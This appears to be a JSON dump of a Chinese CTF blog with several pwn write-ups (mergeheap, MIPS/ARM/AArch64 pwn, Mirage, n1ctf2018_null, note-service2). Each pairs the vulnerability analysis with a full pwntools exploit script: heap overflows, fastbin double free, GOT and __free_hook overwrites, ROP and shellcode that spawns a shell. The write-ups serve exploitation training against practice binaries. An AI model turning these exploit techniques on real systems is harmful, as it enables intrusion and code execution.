#在不影响log_file结构体的情况下，我们抬升_IO_write_base 13个字节，然后再-=50  WizardSpell(-2,&#x27;\\x00&#x27;*13)    for i in range(3):     #_IO_write_base = _IO_write_base + 1 - 50     WizardSpell(-2,&#x27;\\x00&#x27;)    #在不影响log_file结构体的情况下，我们抬升_IO_write_base 9个字节，然后再-=50  WizardSpell(-2,&#x27;\\x00&#x27;*9)  WizardSpell(-2,&#x27;\\x00&#x27;)    #现在，_IO_write_base指向了log_file的结构体附近处，我们可以修改log_file的结构体了  payload = &#x27;\\x00&#x27; * 3 + p64(0x231)  #flags  payload += p64(0xFBAD24A8)  WizardSpell(0,payload)  #_IO_read_ptr  _IO_read_end  payload = p64(atoi_got) + p64(atoi_got+0x100)  WizardSpell(0,payload)  atoi_addr = u64(sh.recv(8))  print hex(atoi_addr)    libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)  libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)    #回到之前的位置  WizardSpell(-2, p64(0) + p64(0))  #重新写  WizardSpell(0, &#x27;\\x00&#x27; * 2 + p64(0x231) + p64(0xfbad24a8))  #需要_IO_read_ptr大于等于_IO_read_end，经过调试，发现输出以后，发现0x50正好  WizardSpell(0, p64(log_addr) + p64(log_addr + 0x50) + p64(log_addr))  #泄露log_file结构体的地址  heap_addr = u64(sh.recvn(8)) - 0x10  print &#x27;heap addr:&#x27;,hex(heap_addr)    WizardSpell(0,p64(heap_addr + 0x100)*3)  #覆盖_IO_buf_base和_IO_buf_end  #然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  WizardSpell(0,p64(atoi_got+0x78 + 23) + p64(atoi_got + 0xA00))    #  WizardSpell(-2,&#x27;\\x00&#x27;)  WizardSpell(-2,&#x27;\\x00&#x27;*3)  WizardSpell(-2,&#x27;\\x00&#x27;*3)    payload = &#x27;\\x00&#x27; + p64(system_addr)  WizardSpell(0,payload)  #getshell  sh.sendlineafter(&#x27;choice&gt;&gt; &#x27;,&#x27;sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["下标越界","IO FILE"]},{"title":"mergeheap","url":"/2020/04/17/mergeheap/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在合并的时候，存在溢出，strcpy、strcat可能会将下一个chunk的size也拷贝过来，从而可以溢出修改下一个chunk的size。\n\n\n并且，由于merge的时候使用的是strcpy、strcat，遇到0字符会截断，因此当我们写64位地址数据的时候，需要从最后一个开始写，前面全部用不截断的字符填充。依次从后往前完成64位数据的布置。通过伪造chunk，利用house of Einherjar，形成overlap chunk后，修改tcache bin chunk的next指针，达到任意地址分配。\n#coding:utf8from pwn import *#sh = process(&#x27;./mergeheap&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29551)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;len:&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;idx:&#x27;,str(index))def merge(index1,index2):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;idx1:&#x27;,str(index1))   sh.sendlineafter(&#x27;idx2:&#x27;,str(index2))#0add(0x80,&#x27;a&#x27;*0x80)#1~7for i in range(7):   add(0x80,&#x27;b&#x27;*0x80)#8add(0x80,&#x27;c&#x27;*0x80)#9add(0x100,&#x27;d&#x27;*0x100)#10add(0x80,&#x27;e&#x27;*0x80)#11add(0x10,&#x27;f&#x27;*0x10)#12add(0x10,&#x27;e&#x27;*0x10)delete(12)delete(11)#泄露堆地址add(0,&#x27;&#x27;) #11show(11)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)add(0,&#x27;&#x27;) #12#7个进tcachefor i in range(1,8):   delete(i)#得到unsorted bindelete(0)#泄露地址add(0,&#x27;&#x27;) #0show(0)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)####第一次，我们修改size#######1add(0x80,&#x27;b&#x27;*(0x80 - 1) + p8(0x90))#2add(0x88,&#x27;b&#x27;*0x88)#9放入0x110的tcache bindelete(9)#3，合并后，会修改9的sizemerge(2,1)#将chunk8的index换到4来delete(8)add(0x80,&#x27;c&#x27;*0x80) #4#清空chunk8某处8字节数据def clearChunk8(offset):   for i in range(7,-1,-1):      delete(4)      add(0x80,&#x27;b&#x27;*offset + &#x27;b&#x27;*i + &#x27;\\n&#x27;) #4def writeChunk8(offset,data):   delete(4)   add(0x80,&#x27;b&#x27;*offset + p64(data)[0:7] + &#x27;\\n&#x27;) #4#清空后一个堆里某处8字节数据def clearLast(offset):   for i in range(7,-1,-1):      #将1、2重新返回tcache bin      delete(2)      delete(1)      #释放0x110的chunk      delete(3)      #1      add(0x80,&#x27;b&#x27;*offset + &#x27;b&#x27;*i + &#x27;\\n&#x27;)      #2      add(0x88,&#x27;b&#x27;*0x88)      #3      merge(2,1)def writePrevSize(data):   #将1、2重新返回tcache bin   delete(2)   delete(1)   #释放0x110的chunk   delete(3)   #1   add(0x80,&#x27;b&#x27;*(0x80 - 9) + p64(data) + &#x27;\\n&#x27;)   #2   add(0x88,&#x27;b&#x27;*0x88)   #3   merge(2,1)####第二次，我们用同样的方法修改prev_size######先清空prev_size处的数据clearLast(0x80 - 9)#现在，写prev_sizewritePrevSize(0x110 + 0x80)#我们要在chunk8里伪造一个chunk#伪造bkclearChunk8(0x18)writeChunk8(0x18,heap_addr - 0x250)#伪造fdclearChunk8(0x10)writeChunk8(0x10,heap_addr - 0x250)#伪造sizeclearChunk8(0x8)writeChunk8(0x8,0x80 + 0x111)delete(1)delete(2)#unsorted bin合并，形成overlap chunkdelete(10)#0x110的chunk放入tcache bindelete(3)#1add(0x70,&#x27;c&#x27;*0x70)#与0x110的chunk重合add(0x70,p64(free_hook_addr) + &#x27;\\n&#x27;)add(0x100,&#x27;/bin/sh\\x00\\n&#x27;) #2#申请到free_hook处add(0x100,p64(system_addr) + &#x27;\\n&#x27;)#getshelldelete(2)sh.interactive()","categories":["CTF"],"tags":["堆溢出","从后往前布置数据"]},{"title":"mips/arm pwn初探","url":"/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/","content":"前言厌倦了x86&#x2F;x64 平台下的二进制漏洞利用，来看看mips&#x2F;arm平台下的pwn是如何达到利用的。众所周知，mips&#x2F;arm架构cpu主要用于嵌入式设备，比如路由器这些。当我们在x86&#x2F;x64平台练习到一定境界后，再去探索一个新的平台下的漏洞利用，我们可以借鉴以前的方法，总之，思想都是一样的。只不过是指令的样子不同而已。\nMIPS架构的pwnmips、mipsel的区别mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。指令的用法是差不多的。\nPwn中需要重点了解的Mips指令传参方式用$a0~$a3传递函数的前4个参数，记忆方法，寄存器名字a实际为argument的缩写。多余的参数用栈传递，可以写一个简单的c程序编译后，反汇编观察，悟出规律。\n函数返回值一般用$v0~$v1寄存器传递。v也就是value的缩写。\n跳转指令j指令跳转到某个标签处，单纯的jmp\njr指令用于跳转到寄存器里的地址值指向的地方。\njal 跳转时，会将返回地址存入$ra寄存器。\njalr 与jal指令类似，只不过后面的对象为寄存器。\n$ra寄存器，ra为，return address的缩写，一般用于存储返回地址，一个函数结尾往往会从栈里弹出一个值赋值给$ra寄存器，然后jr $ra。\n内存读取指令sw register,addr指令，sw即store word的缩写（对应的有store byte）,将register寄存器里的值写入到addr地址处。\nlw register,addr指令，lw即load word的缩写（对应的有load byte）,读取addr处的数据，放入register寄存器。\n寻址la指令，相当于x86的lea\nlai指令，i的意思是immediate立即数，即后面的对象为立即数。\nla $a0,1($s0)指令，带有偏移的寻址，它的作用是$a0 &#x3D; 1 + $s0\n例题安洵杯axb_2019_mips首先，最开始依然是检查程序的保护机制，发现所有保护都没开。\n\n\nqemu-mipsel运行，提示缺少库，最快速的解决方法是下载现成的库，省去自己编译。Mipsel的uclibc库在这里https://github.com/MonkeyJacky/mipsel-linux-uclibc\n\n\n然后，我们使用-L加载库，就可以运行了\n\n\n接下来，我们用IDA分析一下程序，vuln函数里存在栈溢出。IDA不能查看mips的伪代码，我们可以用ghidra工具来查看。\n\n\n由于代码过于简单，我们可以直接看到漏洞。$fp寄存器可以理解为x86下的ebp。由于题目没有给我们uclibc的版本，因此，我们泄露函数地址后，也很难确定system这些函数的地址。但是想到本题没有开NX保护，于是，我们可以ret2shellcode。但是，我们还不知道栈地址。由于没有开启PIE，因此我们可以先rop调用read向bss段输入shellcode，然后栈迁移到bss段。\n寻找gadgets仍然使用ROPgadget工具来找，然后，我们找一下能够控制a0~a3寄存器的gadgets，发现，最多可以自由控制$a0寄存器。这意味着我们可以执行带一个参数的函数。如果题目给了我们uclibc，那么可以很容易利用rop，构造system(“&#x2F;bin&#x2F;sh”)。但是，题目没有给我们uclibc。想要控制read的3个参数，在mips下没有那么轻松。或许我们可以ret2text。\n\n\n$fp寄存器的值，在我们溢出后函数结束时，就会被栈里的值覆盖，因此,$fp可控，从而$v0可控，从而$a1可控。而$a0、$a2也在代码里控制住了。因此,我们让$a1指向bss段，从而可以向bss段输入shellcode。当read结束后, move $sp, $fp指令会使得栈发生迁移，我们在bss段的shellcode前面放置shellcode的地址，，这样shellcode的地址就会被放入到$ra寄存器，进而可以ret到shellcode。\n调试用IDA的远程gdb调试，qemu加-g设置端口。\n完整exp#coding:utf8from pwn import *#由于不知道uclibc版本，所以，我们利用栈迁移，在bss段布下shellcode执行即可#sh = process(argv=[&#x27;qemu-mipsel&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/mips_os/mipsel-linux-uclibc&#x27;,&#x27;./mips_pwn2&#x27;])#sh = process(argv=[&#x27;qemu-mipsel&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/mips_os/mipsel-linux-uclibc&#x27;,&#x27;./mips_pwn2&#x27;])sh = remote(&#x27;node3.buuoj.cn&#x27;,27820)bss = 0x410B70text_read = 0x4007E0sh.sendafter(&quot;What&#x27;s your name:&quot;,&quot;haivk&quot;)shellcode = asm(shellcraft.mips.linux.sh(),arch=&#x27;mips&#x27;)#ret2shellcodepayload = &#x27;a&#x27;*0x20#fppayload += p32(bss + 0x200 - 0x40 + 0x28)#调用read向bss段输入shellcode，然后ret到bss段payload += p32(text_read)sh.send(payload)sleep(1)payload = &#x27;a&#x27;*0x24#rapayload += p32(bss + 0x200 + 0x28)payload += shellcodesh.send(payload)sh.interactive()\n\nARM架构的pwn掌握了mips的pwn利用方法后，arm是类似的。\nARM和AARCH64ARM是32位架构，AARCH64是64位架构。\nPwn中需要重点了解的AARCH64指令传参方式用$a0~$a3传递函数的前4个参数，记忆方法，寄存器名字a实际为argument的缩写。多余的参数用栈传递，可以写一个简单的c程序编译后，反汇编观察，悟出规律。\n函数返回值W0、X1、X2寄存器用于前3个参数，其他的可以自行写一个c语言程序编译后反汇编观察。\n跳转指令X29寄存器作用相当于x64的rbp，X30寄存器用于保存返回地址，当**[执行RET指令时，会将X30的值赋值给PC寄存器。]{.mark}**PC寄存器即x64的rsp。\nb指令跳转到某个标签处，单纯的jmp\nBL指令用于跳转，并且会将返回地址保存在X30寄存器中。然后函数开头一般就会将这两个寄存器的值保存到栈里。\n\n\nLDP X29, X30, [SP+var_s0],#0x10;RET 指令，相当于x64的pop rbp; ret。\n内存读取指令str register,addr指令，st即store的缩写,将register寄存器里的值写入到addr地址处。\nldr register,addr指令，ld即load dword的缩写,读取addr处的数据，放入register寄存器。\nLDP register1, register2,addr ，从addr读取两个dword，分别存入register1、register2。\nSTP register1, register2,addr ，将register1、register2的值依次存入addr处。\n寻址ADRP X0, #label@PAGE指令，将label所处的页的基地址存入X0。\n接下来\nADD X0, X0, #label@PAGEOFF指令，偏移加上基地址，得到label的地址。\n栈布局假设，我们有这样的一个程序，\nvoid fun() &#123;  char buf[0x20];&#125;int main() &#123;  fun();&#125;\n\n当我们进入fun函数时，栈的布局是这样的\n\n             数据                               所有者\n\n\n           X29 value                              fun\n\n           X30 value                              fun\n\n              buf                                 fun\n\n           X29 value                             main\n\n           X30 value                             main\n\n\n也就是说，[函数的rbp和rip不再保存到栈底，而是栈顶！！]{.mark}\n因此，栈溢出，修改的是调用者函数的X29和X30。\n列题shanghai2018_baby_arm首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下程序\n很明显的栈溢出漏洞\n\n\n默认导入了mprotect，所以我们可以利用ROP绕过NX保护，然后ret2shellcode。\n\n\nx64下的ret2csu方法仍然可以用\n\n\n完整exp#coding:utf8from pwn import *#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/aarch64-libs&#x27;,&#x27;./baby_arm&#x27;])#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/aarch64-libs&#x27;,&#x27;./baby_arm&#x27;])sh = remote(&#x27;node3.buuoj.cn&#x27;,28102)elf = ELF(&#x27;./baby_arm&#x27;)mprotect_plt = elf.plt[&#x27;mprotect&#x27;]&#x27;&#x27;&#x27;.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10].text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20].text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30].text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40.text:00000000004008DC                 RET&#x27;&#x27;&#x27;csu_ldr = 0x4008CCcsu_call = 0x4008ACshellcode = asm(shellcraft.aarch64.linux.sh(),arch=&#x27;aarch64&#x27;)payload = p64(mprotect_plt) + shellcodesh.sendafter(&#x27;Name:&#x27;,payload)shellcode_addr = 0x411068 + 8sleep(1)payload = &#x27;a&#x27;*0x48 + p64(csu_ldr)payload += p64(0) #X29payload += p64(csu_call) #X30payload += p64(0) + p64(1) #X19, X20payload += p64(shellcode_addr-8) #X21,,protect的plt指针payload += p64(0x1000007) #X22payload += p64(len(shellcode)) #X23payload += p64(shellcode_addr) #X24#ret2shellcodepayload += p64(0) #X29payload += p64(shellcode_addr) #x30sh.send(payload)sh.interactive()\n\n调试用IDA的远程gdb调试，qemu加-g设置端口。\nARMEABI前面介绍了arm 64位架构，armeabi是32架构，指令也类似，只不过它的栈布局与常规的一样，R11和PC的值保存在栈底。R11充当ebp，PC充当RIP。LDMFD SP!, {R11,PC}指令即相当于pop ebp;ret的作用。\n\n\n例题inctf2018_wARMup首先，检查一下程序的保护机制\n\n\n需要注意的是，这里显示arm的NX enabled可能不可靠，通过验证发现堆栈仍然可以执行。因此，我们遇到了arm应该先尝试看看是否堆栈可执行。\n然后，我们用IDA分析一下，发现一个栈溢出漏洞，但是，我们溢出的尺度不大。因此执行不了太多gadgets。\n\n\n寻找gadgetsArm通过R0、R1、R3、R4传递前4个参数，其余的可以自行调试观察。最开始是想到利用puts来泄露，因此，我们需要控制R0寄存器。但是发现找不到一条合适的gadget，因为溢出尺度不大，所以没有找到合适的gadget能够控制R0。因此，尝试ret2shellcode的方法，由于栈地址我们是不知道的，所以我们需要将shellcode布置到bss段，然后ret过去。因此，我们需要调用read函数，但是read函数有三个参数，也不好控制，因此，采用与mips_pwn例题一样的方法，ret2text。\n\n\n其中，R3我们能够找到合适的gadget来控制，因此buf可控，我们就能在bss段布置shellcode。Read结束后，结尾这里会进行栈迁移，因此，我们在shellcode前面放置shellcode的地址，这样就能ret到shellcode里。\n\n\n这里的利用方法似乎与前面介绍的mips的例题一模一样，只是指令不一样罢了。\n完整exp#coding:utf8from pwn import *#虽然checksec显示NX保护开启，但是可能不准确，调试发现堆栈可以执行#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/arm-libs&#x27;,&#x27;./wARMup&#x27;])sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/arm-libs&#x27;,&#x27;./wARMup&#x27;])sh = remote(&#x27;node3.buuoj.cn&#x27;,28774)main_read = 0x00010530bss = 0x00021034#pop &#123;r3, pc&#125;pop_r3_pc = 0x00010364payload = &#x27;a&#x27;*0x64#r11payload += p32(bss + 0x300)payload += p32(pop_r3_pc)payload += p32(bss + 0x300)#调用main函数里的read先bss短输入新的rop，然后栈迁移到bss段payload += p32(main_read)sh.sendafter(&#x27;Welcome to bi0s CTF!&#x27;,payload)sleep(1)#raw_input()shellcode = asm(shellcraft.arm.linux.sh(),arch=&#x27;arm&#x27;)sh.send(p32(bss + 0x300 + 4) + shellcode)sh.interactive()\n\n总结要学会灵活运用，掌握的是利用的思想，至于平台不同，只是外表的样子看起来不同罢了，思想都是那样，因此，在漏洞挖掘的路上，要学会举一反三。\n","categories":["CTF","IOT"],"tags":["aarch64","mips","arm"]},{"title":"Mirage(fastbin的堆头size位有效只有4字节)","url":"/2020/02/13/mirage/","content":"首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n看似复杂，但是我们的关注点在这里\n\n\n当我们的初始化数据包满足条件，就能显示出菜单。\n一个经典的增删查程序\n\n\nDelete操作里有两个漏洞，一个是下标可以负向越界，另一个是对于下标大于46的，堆指针会被保留在数组里\n\n\n而程序实际可以创建到下标48处（即49个堆），\n\n\n那么，对于下标为47的堆，可以被我们double free，由于都是fastbin范围的块，我们需要让fastbin形成循环单链表。因此，我们delete(47)、delete(0)、delete(46)即可。\n为什么第三个是delete(46)，因为我们delete(0)后，原先在47位置的堆指针赋值到了46处。\n程序在功能5有一个后门\n\n\n不过需要chunk_number+8处数据满足条件。因此，我们用fastbin attack来攻击chunk_number。\n\n\n我们控制chunk_number在0x20~0x2F的范围，使它伪造成一个chunk的size，这样，我们就能把它链接到之前的fastbin链表里，通过申请，就能申请到此处。\n为了让chunk_number减少2个，但又不往fastbin里面新增chunk，我们可以delete()两个个空指针。于是我们执行两次的delete(-2)\n不过，我们**[直接输入-2是不行的]{.mark}**\n\n\n因为负号会被检测到，由此，我们采用补码的形式传入即可\n#-2处是空的，free()空指针不会出错，我们可以让count减去2  for i in range(2): #腾出两个空间     #即delete(-2)     delete(0x100000000-2)  \n\n然而，当我们delete(-2)后，变成这样了\n\n\n[有堆的地址写到了fake_chunk的size的区域，如果把它链接到0x20的fastbin，申请看似会出错。]{.mark}\n然而，事实是不会出错。这是怎么回事？？\n我们来做个试验\n编译这段c语言代码，发现堆成功申请到目标地址处\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;stdint.h&gt;    int main() &#123;     printf(&quot;uint size=%d\\n&quot;,sizeof(unsigned int));     char *p1 = (char *)malloc(0x10);     char *p2 = (char *)malloc(0x10);     free(p2);     free(p1);     *((int64_t *)(p2-0x8)) = 0xFFFFFFFF0000002F;     char *p3 = (char *)malloc(0x10);     char *p4 = (char *)malloc(0x10);     strcat(p2,&quot;P4P4P4P&quot;);     printf(&quot;*p4=%s,*p2=%s&quot;,p4,p2);     return 0;  &#125;  \n\n我们发现，[size域高4字节数据对伪造的fastbin没有影响。]{.mark}\n我们来看看glibc的源码\n/* offset 2 to use otherwise unindexable first 2 bins */  #define fastbin_index(sz) \\    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)  \n\n注意到size被强制转换为unsigned int后再进行的计算。而unsigned int为4字节。这就解释的通了。这也是我的**[新发现]{.mark}**。\n综上，我们完整的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./mirage&#x27;)  chunk_number_addr = 0x60514C    def init_connection():     sh.send(&#x27;RPCM&#x27; + p32(0) + p32(0x42,endian = &#x27;big&#x27;))    def create(content):     sh.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)     sh.sendafter(&#x27;content: &#x27;,content)    def show(index):     sh.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;id: &#x27;,str(index))    def delete(index):     sh.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)     s = str(index)     #sh.sendafter(&#x27;id: &#x27;,s)     sh.sendlineafter(&#x27;id: &#x27;,str(index))    init_connection()  for i in range(49):     create(&#x27;a&#x27;*0x4)    #形成双向链表  delete(47)  delete(0)  #delete 0 后，原来47的位置的指针移动到了46  delete(46)  #-2处是空的，free()空指针不会出错，我们可以让count减去2  for i in range(2): #腾出两个空间     #即delete(-2)     delete(0x100000000-2)  raw_input()  #将chunk_number_addr处的空间链入0x20大小的fastbin  #为了将chunk_number处的空间链入0x20大小的fastbin，我们需要让chunk_number接近0x20伪装成size  create(p32(chunk_number_addr - 0x8))  create(&#x27;a&#x27;*0x4)  create(&#x27;a&#x27;*0x4)  create(p32(0x100000000-17))  #getshell  sh.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["UAF","fastbin","下标越界"]},{"title":"n1ctf2018_null（通过劫持线程arena达到任意地址分配）","url":"/2020/07/26/n1ctf2018_null/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，主函数启动了一个线程\n\n\n在线程里，是一个循环\n\n\n其中输入函数存在溢出，由于a2没有更新，因此，如果将数据分成2部分读入的话，第二次，仍然可以读入a2个数据，从而溢出。\n\n\n溢出尺寸比较大，如果能够覆盖到线程arena，那么就能将fake_chunk链接到fastbin，进而分配过去。但是arena是先mmap出来的，heap是过后才分配出来，因此，线程heap的地址比arena的地址要高。为了能够让heap地址处在arena前方，我们得先耗尽当前的heap空间，这样系统就可以重新mmap一块新内存，就可能会出现在arena前方。\n首先，查看一下内存映射\n\n\n我们看看0x7efcec000000处的内容，从链表特征上来看，这是一个线程arena结构，它位于地址较低的地方\n\n\n我们来看看后方的内容\n\n\n可见，我们的堆在arena的后方，假如我们耗尽这些堆空间，我们再看看\n\n\n我们查看一下内容，此处是arena\n\n\n而它前面是新mmap的heap空间，因此，我们只需要继续malloc，直接正好接近arena，我们溢出，覆盖arena，修改fastbin，将fake_chunk链接上去。\n#coding:utf8from pwn import *sh = process(&#x27;./n1ctf2018_null&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26808)elf = ELF(&#x27;./n1ctf2018_null&#x27;)system_plt = elf.plt[&#x27;system&#x27;]sh.sendlineafter(&#x27;password:&#x27;,&quot;i&#x27;m ready for challenge&quot;)def add(size,n,content=&#x27;&#x27;):   sh.sendlineafter(&#x27;Action:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendlineafter(&#x27;Pad blocks:&#x27;,str(n))   if content == &#x27;&#x27;:      sh.sendlineafter(&#x27;Content? (0/1):&#x27;,&#x27;0&#x27;)   else:      sh.sendlineafter(&#x27;Content? (0/1):&#x27;,&#x27;1&#x27;)      sh.sendafter(&#x27;Input:&#x27;,content)for i in range(12):   add(0x4000,1000)add(0x4000,262,&#x27;0&#x27;*0x3FF0)#溢出，修改thread_arena，将bss上的fake_chunk接到fastbin里payload = &#x27;1&#x27;*0x50 + p32(0) + p32(3) + 10*p64(0x60201d)sleep(0.2)sh.send(payload)sleep(0.2)payload = &#x27;/bin/sh&#x27;.ljust(0xB,&#x27;\\x00&#x27;) + p64(system_plt)payload = payload.ljust(0x60,&#x27;b&#x27;)add(0x60,0,payload) #申请到bss上，修改函数指针，getshellsh.interactive()","categories":["CTF"],"tags":["堆溢出","线程堆","fastbin","堆风水"]},{"title":"note-service2","url":"/2019/11/10/note-service2/","content":"首先看一下程序的保护机制，注意，PIE是开启的，这个checksec检测PIE有时候不准确。不过，我们看到[NX是关闭的，说明堆栈的数据可以被当做指令执行]{.mark}\n\n\n然后，我们用IDA分析一下,发现是一个很简单程序，并且只有添加和删除功能，其他功能未实现\n\n\n创建这里，有三处值得我们注意\n\n\n\n[创建的堆空间大小最多为8字节]{.mark}\n\n[保存堆指针的数组下标可以越界]{.mark}\n\n\n既然数组下标可以越界，那么我们就可以把任意的地方的8字节数据写成新建的堆的地址指针\n[那么，通过数组越界，我们可以把一些函数的GOT表内容修改为堆指针，由于程序NX保护是关闭的，那么堆栈里的数据也可以当成指令执行。那么我们在堆里布置shellcode即可]{.mark}\n有一点需要注意的是，我们的堆空间最多为8字节，并且我们最多向里面输入7字节数据\n\n\n而我们的shellcode最少也要十几字节，因此，我们把shellcode分开，存储到多个堆里，然后在每个堆的最后2字节空间，填上jmp short xxxx指令，让它跳转到下一个堆里去执行代码。\nJmp short xxxx指令占用2字节，并且，这条指令使用的是[相对当前代码位置寻址，]{.mark} 为了发现规律，我们找几个现成的指令看看\n\n\n看看它们的十六进制\n\n\n首先，我们计算第一个看看\n0xE94 + 0x3B &#x3D; 0xECF\n0xEA0 + 0x2F &#x3D; 0xECF\n结果与目标地址还差2，因此，我们推断jmp short xxx中的xxx计算公式\n[xxx &#x3D; 目标地址-当前地址-2]{.mark}\n经过试验和查阅资料，发现确实如此。\n由于我们创建堆的时候是按顺序创建下来的，并且期间没有进行删除操作，我们的堆统一为8字节(根据64位堆的数据结构，至少保证有prev_size、size、fd、bk的空间，实际上的大小为8 align to 32 &#x3D; 32字节)，并且，使用中的堆块的fd和bk被当成数据区，因此我们的数据是从这里开始的，导致后面还有0x8字节空数据。\n\n\n现在我们想从chunk0的jmp出跳到chunk1的data处执行新代码，那么我们jmp short后面的偏移为\n注意那个末尾的1字节0，是输入函数给我们加上的，我们真正只能使用data区的7个字节，也就是我们的每个块里最多放7个字节的指令\nJmp short后面的next值的计算\n[next &#x3D; (8 + 8 + 8 + 1 + 2 - 2) &#x3D; 0x19]{.mark}\n现在我们就开始在堆里构造shellcode，我们的目的是在几个堆里构造处这样的代码\n;64位系统调用  mov rdi,xxxx;/bin/sh字符串的地址  mov rax,59;execve的系统调用号  mov rsi,0;  mov rdx,0  syscall  \n\n关键是rdi的值，在这里，如果我们将atoi的got表内容指向我们的第一个堆空间\n\n\n\n\n那么当我们下一次输入选项时，我们输入&#x2F;bin&#x2F;sh就直接get到了shell\n因此，我们决定修改atoi的got表，让它指向我们的第一个堆\n但是，修改atoi的GOT表操作必须放到最后一步，因为我们修改atoi的got表后，就不能再做其他功能了，因为输入选项不再有效，想想为什么？\n但是，我们又得保证最后创建的那个堆位于其他几个堆的开头，即位于第一个堆，那么就可以先事先创建第一个堆用来占用那个空间，最后的时候delete掉后再申请回来(fastbin特性)，通过数组越界把它的指针存到atoi的GOT表里。\n[那么atoi的GOT表和数组下标的关系是什么呢？]{.mark}\n我们的数组的静态地址在这\n\n\n然后，atoi的GOT表静态地址在这\n\n\n两者相差0x40字节,0x40 &#x2F; 8 &#x3D; 8字节，也就是说,数组下标-8处就是atoi的GOT表\n综上，我们的exp脚本如下\n#coding:utf8  from pwn import *    sh = process(&#x27;./pwnh21&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,30061)    context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)  def create(index,size,content):     sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;index:&#x27;,str(index))     sh.sendlineafter(&#x27;size:&#x27;,str(size))     sh.sendafter(&#x27;content:&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;index:&#x27;,str(index))    #rax = 0 jmp short next_chunk  code0 = (asm(&#x27;xor rax,rax&#x27;) + &#x27;\\x90\\x90\\xeb\\x19&#x27;)  #rax = 0x3B jmp short next_chunk  code1= (asm(&#x27;mov eax,0x3B&#x27;) + &#x27;\\xeb\\x19&#x27;)  #rsi = 0 jmp short next_chunk  code2 = (asm(&#x27;xor rsi,rsi&#x27;) + &#x27;\\x90\\x90\\xeb\\x19&#x27;)  #rdi = 0 jmp short next_chunk  code3 = (asm(&#x27;xor rdx,rdx&#x27;) + &#x27;\\x90\\x90\\xeb\\x19&#x27;)  #系统调用  code4 = (asm(&#x27;syscall&#x27;).ljust(7,&#x27;\\x90&#x27;))    &#x27;&#x27;&#x27;&#x27;&#x27;print len(code0) print len(code1) print len(code2) print len(code3) print len(code4) &#x27;&#x27;&#x27;    create(0,8,&#x27;a&#x27;*7)  create(1,8,code1)  create(2,8,code2)  create(3,8,code3)  create(4,8,code4)  #删除第一个堆块  delete(0)    #把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)，即修改了atoi的GOT表  create(-8,8,code0)  #getshell  sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;/bin/sh&#x27;)    sh.interactive()  